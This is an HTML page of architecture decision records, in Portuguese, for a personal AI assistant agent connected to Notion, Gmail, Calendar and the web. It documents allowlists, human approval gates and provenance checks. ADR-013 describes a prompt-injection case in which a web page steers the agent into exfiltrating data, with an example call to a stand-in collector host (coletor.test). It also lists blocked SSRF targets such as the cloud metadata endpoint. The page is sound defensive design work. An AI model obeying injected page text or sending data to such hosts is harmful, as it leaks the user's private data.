@@ -1,0 +1,303 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Decisões arquiteturais — Personal Chief of Staff</title>
+  <link rel="stylesheet" href="../assets/styles.css">
+</head>
+<body>
+  <div class="layout">
+    <aside class="sidebar">
+      <div class="brand"><strong>Personal Chief of Staff</strong><span>Portal técnico do projeto</span></div>
+      <nav class="nav" aria-label="Navegação principal">
+        <a href="../index.html">Visão geral</a>
+        <a href="overview.html">Arquitetura</a>
+        <a class="active" href="decisions.html">Decisões</a>
+        <a href="../development/001-project-bootstrap.html">001 · Bootstrap</a>
+        <a href="../development/002-notion-integration.html">002 · Notion sem IA</a>
+        <a href="../development/003-tools.html">003 · Tools</a>
+        <a href="../development/004-deep-agent.html">004 · Deep Agent</a>
+        <a href="../development/005-hardening-phases-1-3.html">005 · Hardening</a>
+        <a href="../development/006-temporal-context.html">006 · Contexto temporal</a>
+        <a href="../development/025-google-calendar.html">025 · Calendar</a>
+        <a href="../development/026-gmail-drafts.html">026 · Gmail</a>
+        <a href="../development/027-domain-subagents.html">027 · Subagentes</a>
+        <a href="../development/028-radar-foundation.html">028 · Fundação RADAR</a>
+        <a href="../development/029-radar-read-tools.html">029 · Consultas RADAR</a>
+        <a href="../development/030-radar-management-queries.html">030 · Consultas gerenciais</a>
+        <a href="../development/031-radar-approved-mutations.html">031 · Mutações aprovadas</a>
+        <a href="../development/032-radar-human-interaction.html">032 · Interação humana</a>
+        <a href="../development/037-radar-advanced-query-resilience.html">037 · Consultas avançadas</a>
+      </nav>
+    </aside>
+    <main class="content">
+      <div class="breadcrumb"><a href="../index.html">Documentação</a> / Arquitetura / Decisões</div>
+      <section class="hero">
+        <div class="eyebrow">Registro de decisões</div>
+        <h1>Por que o sistema é construído assim</h1>
+        <p class="lead">Decisões arquiteturais preservam o contexto que não aparece no código: o risco observado, as alternativas consideradas e o custo aceito.</p>
+        <div class="callout">Estado: decisões aceitas até o hardening conversacional RADAR. Mudá-las exige atualizar este registro, os testes de contrato e a documentação da fase afetada.</div>
+      </section>
+
+      <section class="card">
+        <h2>ADR-001 · Services determinísticos entre tools e integrações</h2>
+        <p><strong>Decisão:</strong> regras de tarefa e projeto permanecem em <code>TaskService</code> e <code>ProjectService</code>. O agente não monta payloads do Notion e o client HTTP não decide regras de negócio.</p>
+        <p><strong>Motivo:</strong> o mesmo CRUD precisa ser testável e executável sem LLM. Essa fronteira permite trocar o modelo ou a interface sem reimplementar o domínio.</p>
+        <p><strong>Alternativas:</strong> colocar o mapeamento no prompt reduziria código inicialmente, mas tornaria renomes de colunas e validação impossíveis de garantir. Um client “inteligente” misturaria HTTP com regras específicas desta aplicação.</p>
+
+        <h2 id="adr-002">ADR-002 · Tools específicas em vez de acesso genérico ao Notion</h2>
+        <p><strong>Decisão:</strong> o agente recebe somente <code>search_projects</code>, <code>search_tasks</code>, <code>create_task</code>, <code>update_task</code> e <code>complete_task</code>.</p>
+        <p><strong>Motivo:</strong> cada operação possui schema, escopo de dados e resultado verificável. Um MCP genérico ou uma tool de HTTP daria acesso maior que o necessário e transferiria garantias do código para o prompt.</p>
+        <p><strong>Trade-off:</strong> uma nova capacidade exige um novo service e uma nova tool. O custo é intencional: torna a expansão revisável e testável.</p>
+        <p><strong>Revisada por:</strong> <a href="#adr-012">ADR-012</a> reabre esta decisão para permitir um canal de escrita via MCP, como fallback e sob aprovação humana obrigatória — a restrição original permanece a regra para tudo que as cinco tools já cobrem.</p>
+
+        <h2>ADR-003 · Identidade é UUID mais pertença ao data source</h2>
+        <p><strong>Decisão:</strong> um identificador do Notion só é confiável quando passa por duas verificações: formato UUID canônico e pertença da página ao data source configurado.</p>
+        <pre><code>texto do modelo
+   ↓ valida UUID
+id canônico
+   ↓ retrieve_page
+parent.data_source_id == data source permitido
+   ↓
+read ou mutation</code></pre>
+        <p><strong>Motivo:</strong> validar apenas uma string permitia que sintaxe de caminho alterasse o endpoint; validar apenas UUID ainda permitiria operar em outra página compartilhada com a integração. Formato e autorização resolvem problemas diferentes.</p>
+
+        <h2>ADR-004 · Retry depende do efeito, não apenas do verbo HTTP</h2>
+        <p><strong>Decisão:</strong> leituras, queries e atribuições idempotentes podem repetir após falha transitória. Criação de página e append de blocos não repetem quando a resposta pode ter se perdido.</p>
+        <p><strong>Motivo:</strong> após um timeout de leitura, repetir uma consulta é seguro. Após um timeout de <code>POST /pages</code>, o servidor pode ter criado a página; repetir automaticamente pode duplicar uma tarefa.</p>
+        <table>
+          <thead><tr><th>Resultado observado</th><th>Representação</th><th>Conduta</th></tr></thead>
+          <tbody>
+            <tr><td>API recusou antes de alterar</td><td><code>failed</code></td><td>Explicar a falha; retry só quando a causa for segura.</td></tr>
+            <tr><td>Resposta de escrita se perdeu</td><td><code>unknown</code></td><td>Não repetir automaticamente; reconciliar primeiro.</td></tr>
+            <tr><td>Uma etapa aplicou e outra falhou</td><td><code>partial</code></td><td>Informar campos confirmados e não confirmados.</td></tr>
+            <tr><td>Resposta válida confirmou tudo</td><td><code>succeeded</code></td><td>Permitir confirmação ao usuário.</td></tr>
+          </tbody>
+        </table>
+
+        <h2 id="adr-005">ADR-005 · Allowlist em publicação e em execução</h2>
+        <p><strong>Decisão:</strong> a lista de cinco tools é aplicada em duas fronteiras. O modelo só as enxerga, e qualquer chamada fora da lista é bloqueada antes do handler executar.</p>
+        <p><strong>Motivo:</strong> esconder uma ferramenta não a remove do grafo. O Deep Agents pode registrar filesystem, shell e delegação internamente; um nome alucinado ou injetado ainda alcançaria o executor sem a segunda barreira.</p>
+        <p><strong>Subagentes:</strong> a delegação <code>task</code> permanece desabilitada. Ela só volta quando existir um domínio próprio, ferramentas próprias e trilha de auditoria aninhada, conforme o Marco M6.</p>
+
+        <h2>ADR-006 · O texto do modelo não decide o status operacional</h2>
+        <p><strong>Decisão:</strong> o resultado global de uma execução é derivado das tool calls. Uma resposta de sucesso não atravessa o gate se uma operação falhou, ficou parcial ou teve resultado desconhecido.</p>
+        <p><strong>Motivo:</strong> instruções no prompt reduzem erros, mas não são uma pós-condição. O código possui os fatos — chamada, resultado e estado — e deve prevalecer sobre a prosa.</p>
+
+        <h2>ADR-007 · Providers suportados são dependências diretas e fixadas</h2>
+        <p><strong>Decisão:</strong> Anthropic e OpenAI são os dois adapters anunciados; ambos ficam declarados diretamente e com versão fixada. O Compose encaminha a spec do modelo e as credenciais correspondentes.</p>
+        <p><strong>Motivo:</strong> a superfície efetiva do Deep Agents varia entre versões e perfis. Uma reconstrução da imagem não pode alterar silenciosamente uma fronteira de segurança. Fixar versões troca atualização automática por upgrades intencionais e testados.</p>
+
+        <h2>ADR-008 · Secrets não entram no build nem nos logs operacionais</h2>
+        <p><strong>Decisão:</strong> <code>.dockerignore</code> remove <code>.env</code>, repositório, ambientes virtuais e caches do contexto; logs registram estrutura, duração e estado, não valores livres de título/notas nem texto cru de exceções.</p>
+        <p><strong>Motivo:</strong> não copiar um arquivo no Dockerfile não impede que ele seja enviado ao daemon. Da mesma forma, truncar um valor não o torna seguro. O log operacional deve permitir diagnóstico sem se transformar num segundo armazenamento de conteúdo sensível.</p>
+
+        <h2 id="adr-009">ADR-009 · Contexto temporal explícito; interpretação probabilística, validação determinística</h2>
+        <p><strong>Decisão:</strong> cada chamada de <code>run_agent()</code> calcula uma vez a data local, o dia da semana e o timezone IANA configurado, e entrega esses fatos ao modelo em uma mensagem de sistema própria da execução. O modelo pode interpretar “amanhã” ou “sexta”, mas precisa emitir <code>YYYY-MM-DD</code>; o schema da tool normaliza e valida esse valor novamente.</p>
+        <pre><code>APP_TIMEZONE + instante timezone-aware
+             ↓ código determinístico
+data local + weekday + timezone
+             ↓ contexto do run
+LLM interpreta linguagem natural
+             ↓ valor ainda não confiável
+schema ISO estrito → date → service</code></pre>
+        <p><strong>Motivo:</strong> uma expressão relativa não possui significado sem uma data de referência e um fuso. Usar o relógio UTC do servidor, congelar “hoje” na construção do agente ou aceitar texto relativo diretamente na tool poderia deslocar um prazo sem produzir erro visível.</p>
+        <p><strong>Alternativas:</strong> um parser temporal completo adicionaria dependência e regras linguísticas antes de existir necessidade comprovada; deixar tudo no prompt não garantiria formato nem validade de calendário. A solução atual usa <code>zoneinfo</code> da biblioteca padrão para os fatos objetivos, mantém a interpretação contextual no modelo e preserva a barreira determinística existente.</p>
+        <p><strong>Trade-off:</strong> a interpretação de linguagem natural continua sujeita ao comportamento do modelo. Por isso a suíte padrão prova contexto, argumentos e efeitos com um modelo roteirizado, enquanto a avaliação do provider real é opt-in. Veja <a href="../development/006-temporal-context.html">006 — Datas e contexto temporal</a>.</p>
+
+        <h2 id="adr-010">ADR-010 · Cancelamento é transição de estado, não exclusão</h2>
+        <p><strong>Decisão:</strong> <code>cancel_reminder</code> desativa a regra e preserva seu ledger. Uma ocorrência em produção disputa atomicamente a transição <code>claimed → cancelled</code> contra <code>claimed → delivering</code>. No primeiro caso nenhum request começa; no segundo a tool informa que a entrega já iniciada ainda pode chegar.</p>
+        <p><strong>Motivo:</strong> apagar regra e ocorrências destruía a evidência necessária para reconstruir o que aconteceu e ainda não revogava o objeto já carregado pelo worker. Uma linha apagada no PostgreSQL não cancela I/O externo. Estados explícitos fazem a resposta ao usuário corresponder ao ponto real da execução.</p>
+        <p><strong>Alternativas:</strong> manter uma transação aberta durante a chamada ao Telegram bloquearia o cancelamento por tempo de rede; apagar e prometer cancelamento imediato seria falso; aceitar sempre “mais uma mensagem” esconderia uma corrida evitável durante a produção do conteúdo.</p>
+        <p><strong>Trade-off:</strong> depois de <code>delivering</code> não existe recall. A regra deixa de produzir ocorrências futuras, mas a tool precisa carregar um aviso. O custo de manter regras desativadas e ocorrências históricas é crescimento controlado do banco, aceito em troca de auditabilidade.</p>
+
+        <h2 id="adr-011">ADR-011 · Conflito de ocorrência fica dentro de savepoint</h2>
+        <p><strong>Decisão:</strong> o insert protegido por <code>(job_id, scheduled_for)</code> roda numa transação aninhada. Um conflito reverte apenas o savepoint; o avanço de <code>next_run_at</code> permanece apto a ser confirmado pela transação externa.</p>
+        <p><strong>Motivo:</strong> no PostgreSQL, capturar <code>IntegrityError</code> em Python não reabilita a transação que o banco já marcou como abortada. Sem savepoint, a suposta rede de idempotência poderia transformar uma colisão num rollback do avanço e reapresentar o mesmo slot indefinidamente.</p>
+        <p><strong>Alternativa:</strong> <code>INSERT ... ON CONFLICT DO NOTHING</code> também resolveria no PostgreSQL, mas exigiria ramificação por dialeto para os testes SQLite. O savepoint expressa a mesma fronteira com a API comum do SQLAlchemy.</p>
+
+        <h2 id="adr-012">ADR-012 · MCP do Notion como fallback de escrita, sob aprovação humana</h2>
+        <p><strong>Problema concreto:</strong> as cinco tools da <a href="#adr-002">ADR-002</a> cobrem o CRUD de tarefas e projetos nas duas data sources configuradas, mas nada além disso — uma propriedade sem tool própria, conteúdo em outra base, ou qualquer operação Notion fora desse escopo fica sem caminho algum para o agente, mesmo quando o pedido do usuário é legítimo.</p>
+        <p><strong>Decisão:</strong> o agente ganha um pequeno conjunto de tools do servidor MCP oficial do Notion (<code>@notionhq/notion-mcp-server</code>, stdio, token de integração — ver <code>app/agent/mcp_tools.py</code>), publicadas como <code>notion_mcp_*</code>. As de leitura funcionam como as demais tools. Toda tool de escrita passa pelo mesmo portão de aprovação que já existia para <code>write_file</code>/<code>edit_file</code>/<code>delete</code> (<code>app.agent.builtins.APPROVAL_REQUIRED_TOOLS</code>): a chamada é recusada até o usuário responder <strong>sim</strong> a uma pergunta que já mostra o payload completo — não existe uma aprovação da chamada separada de uma aprovação dos dados, porque o payload é conhecido antes de qualquer efeito colateral.</p>
+        <pre><code>modelo pede notion_mcp_API_post_page(...)
+             ↓ ToolAllowlistMiddleware, antes do handler
+sem aprovação registrada para este tool+payload exato → recusa
+             ↓ aplicação pergunta ao usuário, mostrando o payload
+"sim"
+             ↓ próximo turno, grant repetido como resultado de tool
+chamada liberada → sessão MCP stdio efêmera → Notion</code></pre>
+        <p><strong>Leitura de bases não configuradas (revisão de 2026-08-12):</strong> a allowlist de leitura passou a incluir <code>API-retrieve-a-data-source</code> e <code>API-query-data-source</code>. Uma base do Notion não é uma página: <code>API-retrieve-page-markdown</code> lê uma linha, se o usuário souber o link dela, mas não havia caminho algum para <em>listar</em> as linhas de uma base fora das duas configuradas — o agente encontrava a base pela busca e então explicava que não conseguia abri-la. As duas são leitura pura e ficam fora do portão de aprovação, como as demais leituras; o <code>retrieve</code> acompanha o <code>query</code> porque um filtro precisa dos nomes reais das propriedades, e um nome inventado devolve vazio, que se parece com uma base sem dados.</p>
+        <p><strong>Trade-off aceito, explicitamente:</strong> o privilégio deixa de ser "escrita apenas nas duas data sources configuradas" e passa a ser "o que a integração alcançar no workspace" — a mesma integração usada por <code>notion_client.py</code>, cujo alcance real é decidido pelo compartilhamento configurado no Notion, não pelo código. A proveniência por busca prévia que protege <code>create_task</code>/<code>update_task</code>/<code>complete_task</code> (uma mutação só aceita um id que veio de uma busca sem ambiguidade no mesmo run) não existe para este canal — a aprovação humana assume esse papel em vez do código. E o schema de cada tool MCP não mora em um arquivo testado como <code>notion_schema.py</code>: vem de uma descoberta ao vivo contra o servidor, cacheada uma vez por processo, porque os nomes das tools já mudaram entre versões do servidor.</p>
+        <p><strong>Por que a aprovação basta como mitigação:</strong> o argumento original da ADR-002 era que um MCP genérico "transferiria garantias do código para o prompt" — uma coluna renomeada viraria uma falha silenciosa de comportamento do modelo. Isso continua verdadeiro para o <em>schema</em>, mas deixa de importar para a <em>segurança</em>: nada é escrito sem que um humano tenha visto exatamente o payload primeiro, então um schema errado produz uma pergunta estranha ou uma chamada recusada pelo próprio Notion — nunca uma escrita silenciosa. A ADR-002 permanece a regra para tudo que as cinco tools cobrem; este canal só existe para o que sobra.</p>
+        <p><strong>Alternativas descartadas:</strong> um segundo passo de confirmação, separado da autorização de usar o fallback, foi considerado e rejeitado — as tools MCP recebem o payload já nos argumentos da própria chamada, então um "posso tentar?" sem os dados ainda visíveis seria uma autorização às cegas, e um passo extra depois seria fricção sem ganho de segurança adicional. Um servidor MCP hospedado (Streamable HTTP) evitaria adicionar Node.js à imagem, mas usa OAuth interativo — o mesmo obstáculo à operação headless atrás de um webhook já registrado na <a href="../development/003-tools.html">página 003</a>.</p>
+
+        <h2 id="adr-013">ADR-013 · Leitura da web sob aprovação por origem</h2>
+        <p><strong>Problema concreto:</strong> o usuário manda um link no Telegram — um artigo, uma página de empresa no LinkedIn, um vídeo — e espera que o assistente saiba do que se trata para registrar aquilo. Nenhuma das tools existentes alcança a web: o agente só conseguia repetir a URL de volta.</p>
+        <p><strong>Decisão:</strong> uma única tool, <code>read_url</code> (<code>app/tools/web.py</code>), que busca uma página pública e devolve título, metadados Open Graph e texto legível. Não existe <code>click</code>, não existe <code>type</code>, não existe execução de JavaScript e não existe sessão entre chamadas. A tool passa pelo mesmo portão de aprovação de <a href="#adr-012">ADR-012</a>, mas a chave aprovada é a <em>origem</em> (<code>scheme://host</code>), não a URL nem o payload: o usuário libera um site uma vez e as demais páginas dele seguem sem nova pergunta.</p>
+        <pre><code>usuário cola https://exemplo.com/artigo
+             ↓ app/application/telegram.py extrai a origem da mensagem crua
+grant {read_url, https://exemplo.com} injetado como resultado de tool
+             ↓ modelo pede read_url(...)
+origem consta do grant → leitura liberada
+
+modelo pede read_url(https://coletor.test/?dados=...)
+             ↓ origem não consta de nenhum grant
+recusa approval_required → aplicação pergunta ao usuário</code></pre>
+        <p><strong>Por que a origem, e por que o link do usuário já vem liberado:</strong> mandar um link <em>é</em> a permissão de abri-lo; perguntar "posso ler este site?" logo depois de o usuário colá-lo seria teatro, não consentimento. A distinção que sobra é a que tem valor de segurança e é a mesma ideia de proveniência que já protege as mutações do Notion: o que o usuário forneceu nesta mensagem é confiável, o que o modelo escolheu sozinho não é. Uma página é texto de terceiros e pode pedir que o agente "busque este outro endereço" — que é exatamente como dados sairiam daqui. Esse caso continua exigindo aprovação. Path, query e fragmento são descartados da chave justamente porque são as partes que um atacante variaria para carregar dados sob uma origem já aprovada.</p>
+        <p><strong>Trade-off aceito:</strong> a <code>AGENTS.MD</code> §12 proíbe "HTTP arbitrário sem sandbox ou política específica". Esta é a política específica: apenas <code>http</code>/<code>https</code>, apenas endereços que resolvem para IP público — loopback, link-local, RFC1918 e o endpoint de metadados <code>169.254.169.254</code> são recusados antes de existir conexão, e a checagem se repete a cada redirect —, resposta limitada em bytes e em tempo, documento parseado e nunca avaliado. O que continua fora: um browser headless de verdade. Sem <code>click</code>/<code>type</code> não há navegação de múltiplos passos, então sites que dependem de JavaScript para renderizar conteúdo devolvem só o que publicam no <code>&lt;head&gt;</code>.</p>
+        <p><strong>Limite medido, não suposto:</strong> verificado contra sites reais em 11/08/2026. Blogs, GitHub, Wikipedia, YouTube e páginas de empresa do LinkedIn devolvem Open Graph completo. Perfis pessoais do LinkedIn respondem <code>HTTP 999</code> (anti-bot) e viram falha honesta. Posts do Instagram respondem <code>200</code> com casca vazia — o caso mais perigoso, porque uma leitura "bem-sucedida" sem conteúdo é a forma que mais convida a um resumo inventado. Por isso o envelope carrega <code>content_available</code>: uma página vazia é um fato que o modelo tem de relatar, não uma ausência que ele possa preencher.</p>
+        <p><strong>O outro lado: gravar a referência.</strong> <code>save_reference</code> é uma tool de primeira classe, não uma chamada pelo fallback MCP da <a href="#adr-012">ADR-012</a>. O fallback funcionaria, mas sua pergunta de aprovação mostra o payload JSON cru — correto para uma escrita arbitrária que ninguém previu, errado para a única operação que esta feature existe para tornar trivial. Guardar um link recém-enviado deve custar uma mensagem, não uma revisão de JSON. Pela mesma razão não há aprovação aqui: é uma criação numa data source dedicada, sem id para confundir e sem nada para sobrescrever — a mesma postura de <code>create_task</code>.</p>
+        <p><strong>Tags abertas, forma fechada.</strong> A base é definida <em>por</em> esta aplicação, então <code>REFERENCE_PROPERTIES</code> em <code>notion_schema.py</code> descreve colunas que o usuário ainda precisa criar: <code>Nome</code> (title), <code>URL</code> (url), <code>Tipo</code> (select), <code>Tags</code> (multi_select), <code>Fonte</code>, <code>Autor</code>, <code>Resumo</code> (rich_text) e <code>Salvo em</code> (date). <code>Tipo</code> é lista fechada porque é a coluna pela qual se filtra e só serve se os valores forem estáveis. <code>Tags</code> é livre, porque etiquetar livremente é o ponto de uma biblioteca de referências — mas o Notion cria a opção na primeira escrita e nunca a remove, então <code>reference_service.normalize_tags</code> impõe a <em>forma</em> (aparadas, sem vírgula, deduplicadas sem diferenciar maiúsculas, no máximo oito) para que "IA", "ia " e "IA," não virem três opções permanentes com o mesmo significado.</p>
+        <p><strong>Ausência é melhor que falha:</strong> enquanto <code>NOTION_REFERENCE_DATA_SOURCE_ID</code> não estiver configurado, <code>save_reference</code> não é publicada ao modelo (<code>agent._available_tools</code>). Publicar uma tool que sempre falha seria pior do que não ter nenhuma: um modelo informado de que sabe guardar referências dirá ao usuário que guardou.</p>
+        <p><strong>Alternativas descartadas:</strong> Playwright em container isolado, falando CDP — dá conta de SPAs e de login, mas reabriria deliberadamente o <code>execute</code> que a <code>builtins.py</code> exclui, exigiria sessão persistente (cookies entre turnos são sequestro de sessão esperando acontecer) e custaria um container de browser para um bot Telegram de um usuário só. Fica disponível como evolução caso o limite acima passe a incomodar de fato. Um servidor MCP de browsing herdaria os mesmos riscos e adicionaria um processo externo a proteger.</p>
+
+        <h2 id="adr-014">ADR-014 · Memória de longo prazo é contexto, nunca autoridade</h2>
+        <p><strong>Problema concreto:</strong> toda execução começava do zero fora da janela de conversa. "Builders" precisava ser explicado toda semana, e uma preferência dita em março voltava a ser violada em agosto. Guardar isso é fácil; o difícil é que memória seria o único texto escrito pelo modelo a sobreviver à própria execução e a entrar em todas as seguintes.</p>
+        <p><strong>Decisão:</strong> uma tabela <code>agent_memories</code> por thread, com teto de 2000 caracteres, injetada por inteiro como mensagem de sistema em cada execução, escrita por <code>remember</code> e apagada por <code>forget</code>. A regra que a torna segura é uma só: <em>uma entrada pode mudar o que o assistente procura e o que ele pergunta; não pode mudar o que ele grava.</em> Isso é enforçado em código, não no prompt — <code>MemoryService</code> recusa qualquer conteúdo com uuid, hexadecimal de 32 caracteres ou link <code>notion.so</code>. Uma entrada que não consegue nomear uma página não pode ser confundida com permissão para escrever nela, e a proveniência que protege <code>update_task</code>/<code>complete_task</code> (id vindo de uma busca sem ambiguidade no mesmo run) permanece intacta.</p>
+        <pre><code>apelido guardado  →  expande o termo de busca
+search_projects   →  devolve o id
+mutação           →  aceita só esse id, como antes</code></pre>
+        <p><strong>Por que o Notion do usuário não é este store:</strong> a base <em>PESSOAS</em>, o board de tarefas e a biblioteca de referências já são um sistema de memória, mantido por ele. Uma cópia dentro do agente entraria em toda execução de graça, enquanto a página que ele edita só entra quando algo vai lê-la — o fato mais desatualizado viraria o mais barato de consultar. Daí o teste de destino no prompt e o <code>kind</code> <code>context</code> definido estreitamente: só o que não tem board (como nomear as coisas, como trabalhar com ele) mora aqui.</p>
+        <p><strong>Nada é gravado em silêncio, e nada é aprovado duas vezes:</strong> a alternativa natural era submeter a escrita ao <code>pending_write_approvals</code> da <a href="#adr-012">ADR-012</a>. Foi descartada por custo de fricção: cada "prefiro respostas curtas" viraria uma ida e volta, e o assistente pararia de anotar. No lugar, <code>_memory_notice</code> monta a partir do <em>trace</em> — nunca da prosa do modelo — uma linha anexada à mesma resposta dizendo o que foi registrado. O usuário revoga citando a entrada de volta. Se o assistente provar que registra coisa errada, a escalada é o portão que já existe, não um novo.</p>
+        <p><strong>Um efeito colateral não pode custar a resposta:</strong> as duas tools ficam fora da evidência de que o status do run é derivado (<code>_without_memory_writes</code>). Sem isso, um <code>remember</code> recusado por orçamento faria <code>_guarded_reply</code> trocar uma resposta correta por "não consegui concluir o pedido". A falha continua sendo relatada pela linha determinística, uma vez por execução. Pela mesma razão, a terceira recusa seguida do mesmo run devolve <code>done: true</code> em vez de mandar consolidar de novo.</p>
+        <p><strong>Trade-off aceito:</strong> o teto significa que memória cheia é uma recusa, não um despejo — nada é resumido sozinho nem descartado por idade. Isso transfere ao assistente a decisão de o que sacrificar, e ele pode escolher mal. É preferível à alternativa: uma entrada que some sem ninguém decidir é a que ninguém percebe que sumiu.</p>
+        <p><strong>Alternativas descartadas:</strong> a arquitetura de memória do <a href="https://github.com/NousResearch/hermes-agent">hermes-agent</a> foi estudada em detalhe e três partes dela foram recusadas. A <em>revisão de segundo plano</em> (um agente forkado relendo cada turno para decidir sozinho o que salvar) dobraria o custo de LLM de toda mensagem e gravaria sem ninguém presente — a mesma objeção das três da manhã do Marco M8. A <em>abstração de providers</em>, com oito plugins externos, prefetch em background e busca semântica, existe porque o store deles é ilimitado; o teto aqui é justamente o que garante que o nosso continue cabendo no prompt, e recuperação só vira problema quando o store deixa de caber. E o <em>store em arquivo</em> (<code>MEMORY.md</code> com lock, detecção de drift e backup <code>.bak</code>) resolve com engenharia o que o PostgreSQL desta aplicação já resolve. Foram aproveitados o bloco congelado por sessão, o orçamento como erro com as entradas devolvidas, e a lição de tornar a recusa terminal depois de algumas tentativas.</p>
+
+        <h2 id="adr-016">ADR-016 · OAuth Google compartilhado, grants separados e calendário primary</h2>
+        <p><strong>Problema concreto:</strong> Calendar e Gmail usam a mesma família de autenticação, mas possuem dados, scopes e revogação independentes. Duplicar o lifecycle de token criaria duas implementações de expiração e <code>401</code>; compartilhar um único refresh token criaria um grant amplo cuja revogação derrubaria as duas integrações.</p>
+        <p><strong>Decisão:</strong> um <code>GoogleOAuthTokenProvider</code> reutilizável, com access token somente em memória e refresh antecipado, alimentado por um refresh token separado por integração. O bootstrap é um script de aplicação instalada com navegador, loopback, <code>state</code>, PKCE e acesso offline; ele imprime o secret uma vez e não edita configuração nem banco. Calendar opera somente sobre <code>primary</code> e usa os scopes <code>calendar.events.owned</code> e <code>calendar.freebusy</code>. Flags desligadas ou configuração incompleta retiram as tools da superfície.</p>
+        <pre><code>GOOGLE_OAUTH_CLIENT_ID + CLIENT_SECRET
+              ├── refresh token Calendar → access token em memória
+              └── refresh token Gmail    → access token em memória</code></pre>
+        <p><strong>Semântica de write:</strong> leituras repetem <code>429</code>/<code>5xx</code>. Escritas não repetem cegamente. Create de evento recebe um id remoto gerado antes do request; resposta perdida ou inválida é reconciliada por GET. Update usa leitura, merge e ETag. Quando a evidência não confirma o estado, o outcome permanece <code>unknown</code>.</p>
+        <p><strong>Alternativas descartadas:</strong> SDK Google adicionaria dependências e esconderia parte do contrato sem remover a necessidade de validar payloads; service account não representa corretamente a agenda pessoal de um único usuário; um token único com todos os scopes aumentaria privilégio e acoplamento operacional.</p>
+        <p><strong>Trade-off:</strong> OAuth desktop exige bootstrap manual e cuidado com o consent screen. O custo é aceito porque credenciais nunca transitam pelo Telegram e cada grant pode ser revogado isoladamente. Detalhes em <a href="../development/025-google-calendar.html">025 · Google Calendar</a>.</p>
+
+        <h2 id="adr-017">ADR-017 · Gmail draft-only e auditoria por minimização</h2>
+        <p><strong>Problema concreto:</strong> a API Gmail torna fácil aproximar leitura, draft e envio numa mesma integração. Para um agente, porém, cada passo muda a natureza do risco: ler expõe conteúdo de terceiros; draft cria um objeto revisável; send fala irreversivelmente em nome do usuário. Ao mesmo tempo, a auditoria padrão copiaria query, endereço, subject, snippet e body para PostgreSQL.</p>
+        <p><strong>Decisão:</strong> o client oferece somente search/get/drafts.create; o service oferece somente busca estruturada, leitura MIME paginada e draft plaintext. Não existe método, rota ou tool de envio. <code>gmail.compose</code> é usado exclusivamente porque <code>drafts.create</code> precisa dele. Attachment é metadata e nunca é baixado.</p>
+        <p><strong>Proveniência:</strong> read aceita somente id retornado por busca do Chief no mesmo run; reply draft exige read confirmado ou busca única. E-mail é conteúdo não confiável e não pode autorizar nenhuma tool.</p>
+        <p><strong>Auditoria:</strong> a projeção ocorre antes do insert. Busca guarda datas/flags/limite e fingerprints; leitura guarda ids, offsets, flags, tamanhos e hash; draft guarda ids remotos, contagem e hashes de destinatários, subject e body. Logs guardam operação, status, latência e tentativas, nunca conteúdo ou token.</p>
+        <p><strong>Alternativas descartadas:</strong> confirmação antes de SEND não foi considerada suficiente, porque ainda deixaria código de envio alcançável e exigiria provar a integridade de outro approval round trip. HTML e anexos ampliariam parsing, injeção e storage antes de existir necessidade observada.</p>
+        <p><strong>Trade-off:</strong> o usuário termina o fluxo no Gmail. Em troca, um erro do agente nunca envia uma mensagem e o draft pode ser revisado ou apagado. Detalhes em <a href="../development/026-gmail-drafts.html">026 · Gmail drafts</a>.</p>
+
+        <h2 id="adr-018">ADR-018 · Filhos leem amplamente; somente o Chief escreve de forma durável</h2>
+        <p><strong>Problema concreto:</strong> com tarefas, agenda e e-mail, pesquisas multi-etapas já justificam especialização. Mas o trace durável do run enxerga a call <code>task</code>, não cada efeito interno; permitir write num filho criaria uma mutação que o status e a auditoria raiz não conseguem reconstruir.</p>
+        <p><strong>Decisão:</strong> remover <code>general-purpose</code> e registrar <code>task-agent</code>, <code>calendar-agent</code> e <code>email-agent</code>. Cada um recebe somente leituras do domínio, filesystem read, <code>list_memories</code>, <code>list_reminders</code>, web sob a ADR-013 e MCP read-only. Todas as mutações externas/duráveis, MCP write, <code>execute</code> e <code>task</code> ficam ausentes e bloqueadas pela allowlist de execução.</p>
+        <pre><code>filho pesquisa → DomainReport → Chief
+                                ↓
+                    repete busca mínima
+                                ↓
+                    única mutation durável</code></pre>
+        <p><strong>Scratch:</strong> cada invocação recebe uma cópia profunda do mapa <code>files</code>. Write é permitido sem aprovação somente sob <code>/tmp/subagents/**</code>, até 16 arquivos e 256 KiB. O resultado perde a chave <code>files</code> inteira, descartando scratch e offloads antes de alcançar o pai ou <code>agent_thread_files</code>.</p>
+        <p><strong>Web:</strong> o filho herda somente origens que a aplicação marcou como confiáveis. Uma origem nova entra em <code>requested_read_origins</code>; o Chief inicia o fluxo normal de aprovação. Links encontrados numa página não herdam confiança.</p>
+        <p><strong>Auditoria e limite aceito:</strong> <code>task</code> guarda tipo, status e projeção do <code>DomainReport</code>; briefing e texto livre viram tamanho/hash. Leituras internas logam correlação e metadata, sem conteúdo. Não há schema aninhado durável no M6 porque filhos não escrevem. Habilitar write real futuramente exige primeiro trace interno durável e uma nova ADR.</p>
+        <p><strong>Alternativas descartadas:</strong> manter o filho general-purpose diluiria responsabilidade; entregar as mutations do domínio ao respectivo filho tornaria o relatório uma alegação impossível de conferir; retirar scratch tornaria consolidações longas desnecessariamente caras. Research Agent continua adiado até possuir tools e responsabilidade próprias. Detalhes em <a href="../development/027-domain-subagents.html">027 · Subagentes de domínio</a>.</p>
+
+        <h2 id="adr-019">ADR-019 · Toda integração de domínio é opcional, e o prompt deriva da superfície</h2>
+        <p><strong>Problema concreto:</strong> Notion era a única integração obrigatória. <code>_build_services()</code> construía o cliente incondicionalmente, as cinco tools de tarefa/projeto eram sempre publicadas e o <code>SYSTEM_PROMPT</code> era uma constante que descrevia todas elas. Uma instalação que quisesse partir deste repositório para outro conjunto de conexões não tinha como desligar o Notion sem apagar código, e Calendar e Gmail — já opcionais — expunham o outro lado do mesmo defeito: com os dois desligados, o prompt continuava descrevendo <code>list_events</code> e <code>draft_email</code>, e <code>build_domain_subagents</code> continuava compilando <code>calendar-agent</code> e <code>email-agent</code> sem tools de domínio.</p>
+        <p><strong>Decisão:</strong> Notion passa a ser opcional nos mesmos termos de Calendar e Gmail — <code>NOTION_ENABLED</code> mais token e os dois data source ids, conferidos por <code>settings.notion_configured</code> antes de qualquer publicação — e o padrão é desligado. E o prompt deixa de ser uma constante: <code>build_system_prompt(available)</code> monta cada bloco a partir do mesmo <code>frozenset</code> de nomes que <code>create_deep_agent</code> recebe.</p>
